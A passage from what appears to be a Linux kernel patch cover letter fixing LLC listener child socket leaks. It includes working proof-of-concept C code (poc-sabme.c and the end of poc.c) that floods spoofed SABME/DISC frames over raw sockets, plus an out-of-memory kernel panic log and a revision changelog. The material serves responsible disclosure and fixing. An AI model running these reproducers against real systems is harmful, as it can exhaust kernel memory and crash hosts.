+			src_mac[ETH_ALEN - 1] ^= 1;
+		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);
+
+		if (sendto(packet_fd, frame, sizeof(frame), 0,
+			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
+			die_errno("sendto(AF_PACKET)");
+
+		if (!(i % DEFAULT_REPORT_EVERY))
+			fprintf(stderr, "sent=%llu\n",
+				(unsigned long long)i);
+		i++;
+	}
+
+	close(packet_fd);
+	close(listener_fd);
+	return 0;
+}
+------END poc.c--------
+
+------BEGIN poc-sabme.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/if.h>
+#include <linux/if_arp.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <linux/llc.h>
+#include <net/ethernet.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#ifndef AF_LLC
+#define AF_LLC 26
+#endif
+
+#define DEFAULT_RX_IF "llc_rx0"
+#define DEFAULT_TX_IF "llc_tx0"
+#define DEFAULT_SAP 0xc0
+#define SABME_CMD 0x6f
+
+static void die_errno(const char *what)
+{
+	perror(what);
+	exit(EXIT_FAILURE);
+}
+
+static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
+{
+	struct ifreq ifr;
+	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	if (fd < 0)
+		die_errno("socket(AF_INET)");
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
+		die_errno("ioctl(SIOCGIFHWADDR)");
+	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
+	close(fd);
+}
+
+static int get_ifindex(const char *ifname)
+{
+	struct ifreq ifr;
+	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	if (fd < 0)
+		die_errno("socket(AF_INET)");
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
+		die_errno("ioctl(SIOCGIFINDEX)");
+	close(fd);
+	return ifr.ifr_ifindex;
+}
+
+static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
+{
+	struct sockaddr_llc addr;
+	int fd = socket(AF_LLC, SOCK_STREAM, 0);
+
+	if (fd < 0)
+		die_errno("socket(AF_LLC)");
+	get_if_hwaddr(ifname, mac);
+	memset(&addr, 0, sizeof(addr));
+	addr.sllc_family = AF_LLC;
+	addr.sllc_arphrd = ARPHRD_ETHER;
+	addr.sllc_sap = sap;
+	memcpy(addr.sllc_mac, mac, ETH_ALEN);
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die_errno("bind(AF_LLC)");
+	if (listen(fd, 16) < 0)
+		die_errno("listen(AF_LLC)");
+	return fd;
+}
+
+static int make_packet_socket(const char *ifname, int *ifindex_out)
+{
+	struct sockaddr_ll sll;
+	int one = 1;
+	int ifindex = get_ifindex(ifname);
+	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+
+	if (fd < 0)
+		die_errno("socket(AF_PACKET)");
+	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_protocol = htons(ETH_P_ALL);
+	sll.sll_ifindex = ifindex;
+	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
+		die_errno("bind(AF_PACKET)");
+	*ifindex_out = ifindex;
+	return fd;
+}
+
+static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
+{
+	mac[0] = 0x02;
+	mac[1] = (n >> 32) & 0xff;
+	mac[2] = (n >> 24) & 0xff;
+	mac[3] = (n >> 16) & 0xff;
+	mac[4] = (n >> 8) & 0xff;
+	mac[5] = n & 0xff;
+}
+
+static void send_sabme(int packet_fd, int ifindex, const unsigned char dst[ETH_ALEN],
+		       const unsigned char src[ETH_ALEN])
+{
+	static unsigned char frame[ETH_ZLEN];
+	struct sockaddr_ll sll;
+
+	memset(frame, 0, sizeof(frame));
+	memcpy(frame, dst, ETH_ALEN);
+	memcpy(frame + ETH_ALEN, src, ETH_ALEN);
+	((struct ethhdr *)frame)->h_proto = htons(3);
+	frame[ETH_HLEN + 0] = DEFAULT_SAP;
+	frame[ETH_HLEN + 1] = 0x04;
+	frame[ETH_HLEN + 2] = SABME_CMD;
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_ifindex = ifindex;
+	sll.sll_halen = ETH_ALEN;
+	memcpy(sll.sll_addr, dst, ETH_ALEN);
+	if (sendto(packet_fd, frame, sizeof(frame), 0,
+		   (struct sockaddr *)&sll, sizeof(sll)) < 0)
+		die_errno("sendto(AF_PACKET)");
+}
+
+static void usage(const char *prog)
+{
+	fprintf(stderr, "usage: %s accept|close [rx_if] [tx_if] [count]\n", prog);
+}
+
+int main(int argc, char **argv)
+{
+	unsigned char dst_mac[ETH_ALEN];
+	unsigned char src_mac[ETH_ALEN];
+	const char *mode;
+	const char *rx_if = DEFAULT_RX_IF;
+	const char *tx_if = DEFAULT_TX_IF;
+	uint64_t count = 1;
+	uint64_t i;
+	int listener_fd;
+	int packet_fd;
+	int ifindex;
+
+	if (argc < 2) {
+		usage(argv[0]);
+		return EXIT_FAILURE;
+	}
+	mode = argv[1];
+	if (argc > 2)
+		rx_if = argv[2];
+	if (argc > 3)
+		tx_if = argv[3];
+	if (argc > 4) {
+		char *end = NULL;
+
+		errno = 0;
+		count = strtoull(argv[4], &end, 0);
+		if (errno || !end || *end != '\0' || !count) {
+			fprintf(stderr, "invalid count: %s\n", argv[4]);
+			return EXIT_FAILURE;
+		}
+	}
+
+	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
+	packet_fd = make_packet_socket(tx_if, &ifindex);
+	fprintf(stderr, "mode=%s listener_if=%s sender_if=%s count=%llu\n",
+		mode, rx_if, tx_if, (unsigned long long)count);
+
+	if (!strcmp(mode, "accept")) {
+		int child;
+		struct sockaddr_llc addr;
+		socklen_t addrlen = sizeof(addr);
+		struct timeval tv = { .tv_sec = 5, .tv_usec = 0 };
+
+		fill_src_mac(src_mac, 1);
+		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
+			src_mac[ETH_ALEN - 1] ^= 1;
+		send_sabme(packet_fd, ifindex, dst_mac, src_mac);
+		setsockopt(listener_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+		child = accept(listener_fd, (struct sockaddr *)&addr, &addrlen);
+		if (child < 0)
+			die_errno("accept(AF_LLC)");
+		printf("SABME passive open accepted\naccept_rc=0\n");
+		close(child);
+		close(packet_fd);
+		close(listener_fd);
+		return 0;
+	}
+
+	if (!strcmp(mode, "close")) {
+		for (i = 1; i <= count; i++) {
+			fill_src_mac(src_mac, i);
+			if (!memcmp(src_mac, dst_mac, ETH_ALEN))
+				src_mac[ETH_ALEN - 1] ^= 1;
+			send_sabme(packet_fd, ifindex, dst_mac, src_mac);
+		}
+		close(packet_fd);
+		close(listener_fd);
+		printf("SABME sent without accept and listener closed\n");
+		return 0;
+	}
+
+	usage(argv[0]);
+	return EXIT_FAILURE;
+}
+------END poc-sabme.c--------
+
+------BEGIN leak sample------
+The original leak-only oracle on the unfixed kernel was a line count of
+/proc/net/llc/socket, not a preserved cat of that table. After 100 DISC
+frames, and after the listener process had already exited:
+
+  wc -l /proc/net/llc/socket
+  before: 0 leftover LLC sockets
+  after 100 frames: 100 leftover entries remained
+
+No raw 100-row proc table from that run was kept. Deleting the listener
+interface then stalled in unregister_netdevice because those children
+still held the device. The panic_on_oom log below is the later
+110000-frame exhaustion of the 2 GB guest, not the leak oracle itself.
+------END leak sample--------
+
+----BEGIN crash log----
+[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
+
+[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3
+
+[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+
+[ 1665.706676][T10284] Call Trace:
+
+[ 1665.706943][T10284]  <TASK>
+
+[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:118 (discriminator 3))
+
+[1665.707568][T10284] panic (kernel/panic.c:611)
+
+[1665.707918][T10284] ? dump_header (arch/x86/include/asm/atomic64_64.h:15 include/linux/atomic/atomic-arch-fallback.h:2583 include/linux/atomic/atomic-long.h:38 include/linux/atomic/atomic-instrumented.h:3189 include/linux/vmstat.h:196 include/linux/vmstat.h:208 mm/oom_kill.c:183 mm/oom_kill.c:473)
+
+[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:288)
+
+[1665.708678][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
+
+[1665.709132][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
+
+[1665.709616][T10284] ? out_of_memory (mm/oom_kill.c:1158 (discriminator 1))
+
+[1665.710024][T10284] out_of_memory (mm/oom_kill.c:1158 (discriminator 1))
+
+[1665.710435][T10284] ? __pfx_out_of_memory (mm/oom_kill.c:1114)
+
+[1665.710868][T10284] ? lock_acquire+0x2f/0xb0
+
+[1665.711243][T10284] ? __alloc_pages_noprof (mm/page_alloc.c:4188 mm/page_alloc.c:4478 mm/page_alloc.c:4839)
+
+[1665.711712][T10284] __alloc_pages_noprof (include/linux/vmstat.h:236 (discriminator 1) mm/page_alloc.c:4201 (discriminator 1) mm/page_alloc.c:4478 (discriminator 1) mm/page_alloc.c:4839 (discriminator 1))
+
+[1665.712184][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
+
+[1665.712658][T10284] ? hlock_class+0x4e/0x130
+
+[1665.713041][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
+
+[1665.713501][T10284] ? __pfx___alloc_pages_noprof (mm/page_alloc.c:4792)
+
+[1665.713991][T10284] ? __pfx___lock_acquire+0x10/0x10
+
+[1665.714431][T10284] ? __sanitizer_cov_trace_switch+0x54/0x90
+
+[1665.714917][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
+
+[1665.715381][T10284] ? policy_nodemask (mm/mempolicy.c:1865 (discriminator 1) mm/mempolicy.c:2066 (discriminator 1))
+
+[1665.715788][T10284] alloc_pages_mpol_noprof (include/linux/mm.h:1637)
+
+[1665.716246][T10284] ? __pfx_alloc_pages_mpol_noprof (mm/mempolicy.c:2227)
+
+[1665.716734][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
+
+[1665.717194][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
+
+[1665.717656][T10284] ? xas_load (lib/xarray.c:243)
+
+[1665.718005][T10284] ? filemap_get_entry (mm/filemap.c:1850)
+
+[1665.718439][T10284] folio_alloc_noprof (include/linux/instrumented.h:68 include/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-flags.h:829 include/linux/page-flags.h:850 mm/internal.h:703 mm/internal.h:699 mm/mempolicy.c:2356)
+
+[1665.718847][T10284] filemap_alloc_folio_noprof (mm/filemap.c:1511)
+
+[1665.719316][T10284] ? __pfx_filemap_alloc_folio_noprof (mm/filemap.c:996)
+
+[1665.719803][T10284] ? filemap_fault (include/linux/instrumented.h:68 include/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-flags.h:562 mm/filemap.c:3241 mm/filemap.c:3342)
+
+[1665.720231][T10284] __filemap_get_folio (mm/filemap.c:3818)
+
+[1665.720683][T10284] filemap_fault (mm/internal.h:1002 mm/filemap.c:3242 mm/filemap.c:3342)
+
+[1665.721097][T10284] ? __pfx_filemap_fault (mm/filemap.c:3315)
+
+[1665.721534][T10284] ? do_pte_missing+0x165a/0x3ff0
+
+[1665.721944][T10284] ? __pfx_lock_release+0x10/0x10
+
+[1665.722375][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645)
+
+[1665.722813][T10284] __do_fault (mm/memory.c:4887)
+
+[1665.723172][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645)
+
+[1665.723621][T10284] do_pte_missing+0x174c/0x3ff0
+
+[1665.724026][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)
+
+[1665.724482][T10284] ? reacquire_held_locks+0x20b/0x4c0
+
+[1665.724932][T10284] ? lock_vma_under_rcu (include/linux/mm.h:718 (discriminator 2) mm/memory.c:6266 (discriminator 2))
+
+[1665.725374][T10284] __handle_mm_fault (mm/memory.c:4791 mm/memory.c:3963 mm/memory.c:5789 mm/memory.c:5932)
+
+[1665.725805][T10284] ? __pfx_lock_release+0x10/0x10
+
+[1665.726207][T10284] ? down_read_trylock (kernel/locking/rwsem.c:1604)
+
+[1665.726640][T10284] ? __pfx___handle_mm_fault (mm/memory.c:5841)
+
+[1665.727085][T10284] ? __pfx_down_read_trylock (kernel/locking/rwsem.c:1562)
+
+[1665.727574][T10284] ? __pfx_lock_vma_under_rcu (mm/memory.c:6256)
+
+[1665.728053][T10284] handle_mm_fault (mm/memory.c:2943)
+
+[1665.728479][T10284] do_user_addr_fault (arch/x86/mm/fault.c:441 arch/x86/mm/fault.c:1230)
+
+[1665.728921][T10284] exc_page_fault (arch/x86/include/asm/irqflags.h:37 arch/x86/include/asm/irqflags.h:114 arch/x86/mm/fault.c:1485 arch/x86/mm/fault.c:1534)
+
+[1665.729305][T10284] asm_exc_page_fault (arch/x86/include/asm/idtentry.h:623)
+
+[ 1665.729700][T10284] RIP: 0033:0x559e433ce5cb
+
+[ 1665.730065][T10284] Code: Unable to access opcode bytes at 0x559e433ce5a1.
+
+[ 1665.730594][T10284] RSP: 002b:00007ffcc17c93f0 EFLAGS: 00010206
+
+[ 1665.731148][T10284] RAX: 000000000000003c RBX: 00007ffcc17c9418 RCX: 0000559e433d10c6
+
+[ 1665.731733][T10284] RDX: 000000000000002c RSI: 0000559e433d10c0 RDI: 0000000000000004
+
+[ 1665.732318][T10284] RBP: 00007ffcc17c9412 R08: 00007ffcc17c9420 R09: 0000000000000014
+
+[ 1665.732904][T10284] R10: 0000000000000000 R11: 0000000000000202 R12: 0000559e433d10c6
+
+[ 1665.733491][T10284] R13: d288ce703afb7e91 R14: 0000000000019194 R15: 0000000000000004
+
+[ 1665.734120][T10284]  </TASK>
+-----END crash log-----
+
+changes in v8:
+  - Reject a connection indication whose skb->sk is the listener itself
+    so accept() cannot lock_sock_nested() the socket it already holds,
+    and drop the extra QUEUED reference only when it was taken.
+  - Drop the extra QUEUED hold from the incoming_children close walk,
+    matching the receive-queue walk.
+  - Do not run the connection state machine on a released incoming child
+    from the listener backlog; leftover in-service child frames run on
+    that child under its lock.
+  - Limit out-of-service tests on the receive path to incoming children
+    and to a looked-up child already marked out of service. SAP unhash
+    is RCU, so drop that later lookup instead of indexing the state
+    table with state 0. This is not a generic llc_conn_service bounds
+    check.
+  - Describe the original /proc/net/llc/socket leak evidence as the
+    wc -l count (0 then 100 leftover entries). No raw proc table from
+    that run was kept.
+  - Do not nested-lock a QUEUED child on itself in llc_backlog_rcv().
+  - Sort the new locals in llc_release_incoming_children() reverse
+    xmas tree.
+  - Drop the unused #include <net/llc_c_st.h> from af_llc.c.
+  - Decode the remaining OOM frames against a rebuilt 6.12.74 vmlinux.
+  - Keep this as the listener child leak and lifecycle fix only. The
+    listen(2) accept-queue bound raised against v7 is independent of the
+    leak and is not included here.
+  - v7 Link: https://lore.kernel.org/all/cover.1788414881.git.zihanx@nebusec.ai/
+changes in v7:
+  - Drop the companion LLC_CONN_OUT_OF_SVC bounds patch due to overlap with
+    Kees Cook's net-next series:
+    https://lore.kernel.org/all/20260901210300.i.590-kees@kernel.org/
+  - That series also covers the connect(2) +1 return and rejecting
+    out-of-service states before table lookup, as raised in review of
+    v6 2/2:
+    https://lore.kernel.org/all/20260902010052.2297527-1-kuba@kernel.org/
+  - Keep only the listener child leak fix for net.
+  - Fix reverse-xmas-tree local ordering in llc_conn_handler() and
+    llc_incoming_sock_work(), align the atomic_cmpxchg() continuation,
+    and add matching braces on the backlog retry if/else.
+  - Release a PENDING child when llc_conn_handler() sees a redirected
+    packet for a TCP_LISTEN socket that is already SOCK_DEAD, instead of
+    dropping the packet and leaving that cleanup only to close().
+  - Keep the init_net CAP_NET_RAW/CAP_NET_ADMIN reproducer; PF_LLC is
+    rejected outside init_net, so unshare -Urn cannot express this path.
+  - Spell out that the crash PoC is DISC-only, include poc-sabme.c for
+    the accept and close paths, and restore the full OOM panic so the
+    leftover /proc/net/llc/socket leak is described next to that log.
+  - Do not tear down an already pending child when a redirected frame
+    fails sk_add_backlog(); drop that frame only.
+  - Track incoming children on the listener and release leftover PENDING
+    sockets from that list on close(), instead of relying only on
+    sk_receive_queue, backlog drain, or a later SOCK_DEAD packet.
+  - Stop taking the listener lock in llc_incoming_sock_work(); the child
+    already holds the listener, and teardown no longer interleaves with
+    llc_ui_release()'s llc_sk_free().
+  - Hold a child socket reference on handshake skbs with
+    skb_set_owner_sk_safe(), so kfree_skb() cannot race asynchronous
+    teardown through sock_rfree().
+  - Finish sock_orphan() and the device put in llc_incoming_sock_work()
+    before llc_sk_free(), so those steps do not run after its sock_put().
+  - Keep the v1 lore Link on its own line, before the numbered-patch
+    diffstat.
+  - Include the original leak-only leftover /proc/net/llc/socket count
+    next to the later panic_on_oom log.
+  - v6 Link: https://lore.kernel.org/all/cover.1787752861.git.zihanx@nebusec.ai/
+changes in v6:
+  - Hold a reference for children queued for accept() and release it when they
+    are dequeued, while retaining SAP publication so tuple lookup still finds
+    a pending child before the passive open completes.
+  - Make direct receive, backlog, accept-queue, and listener-close cleanup
+    symmetric, with bottom-half-disabled child locking in process context.
+  - Keep the LLC_CONN_OUT_OF_SVC lower-bound check in its separate patch and
+    use the ADM state boundary consistently.
+  - v5 Link: https://lore.kernel.org/all/20260822082354.3109-1-zihanx@nebusec.ai/
+changes in v5:
+  - Make listener child cleanup unconditional so queued children are also
+    released if the socket leaves TCP_LISTEN before close.
+  - Serialize process-context child cleanup and backlog dispatch with bottom
+    halves disabled, avoiding child-lock acquisition races with LLC receive
+    and timer paths.
+  - Drop packets redirected through a pending child after its listener is no
+    longer listening, and release children left out of service instead of
+    dispatching them.
+  - Split the LLC_CONN_OUT_OF_SVC lower-bound check into a separate patch.
+  - v4 Link: https://lore.kernel.org/all/20260814185843.4748-1-zihanx@nebusec.ai/
+changes in v4:
+  - Create a passive-open child only for SABME and generate listener-side DM
+    replies directly for non-SABME commands.
+  - Use an atomic incoming-child lifecycle and serialize pending-child lookup,
+    backlog processing, rollback, and listener close with the child lock.
+  - Keep immediate SAP publication for passive-open tuple matching, but release
+    unaccepted children on direct and backlog failures and on listener close.
+  - Defer final incoming-child cleanup to workqueue context so timer
+    synchronization does not run in the receive softirq path.
+  - Add an LLC state lower-bound check before state-table dispatch.
+  - v3 Link: https://lore.kernel.org/all/20260805175945.10698-1-zihanx@nebusec.ai/
+changes in v3:
+  - Drop the unused llc_conn_handler() local rc variable reported in review.
+  - Rebase the numbered patch and cover onto commit
+    ede76849012e45ffb2193ad110b42027eec02c5c.
+  - v2 Link: https://lore.kernel.org/all/cover.1785386749.git.zihanx@nebusec.ai/
+changes in v2:
+  - Rework the fix to preserve the existing passive-open tuple matching
+    semantics instead of deferring child publication until LLC_CONN_PRIM.
+  - Track listener-created children pending publication to accept(), and roll
+    them back on every earlier failure or drop path.
+  - Cover the original non-SABME leak and SABME paths which fail before
+    LLC_CONN_PRIM, including backlog enqueue and backlog drop failures.
+  - Correct Fixes to 1da177e4c3f4 ("Linux-2.6.12-rc2") based on the earliest
+    locally visible history carrying the same root-cause fact.
+  - Clarify panic_on_oom crash evidence and packetdrill selection.
+  - v1 Link: https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (1):
+  llc: fix listener child socket leaks before passive open completes
+
+ include/net/llc_conn.h |  15 +-
+ net/llc/af_llc.c       |  27 +++-
+ net/llc/llc_conn.c     | 353 +++++++++++++++++++++++++++++++++++++++--
+ 3 files changed, 379 insertions(+), 16 deletions(-)
+
+-- 
+2.43.0
 
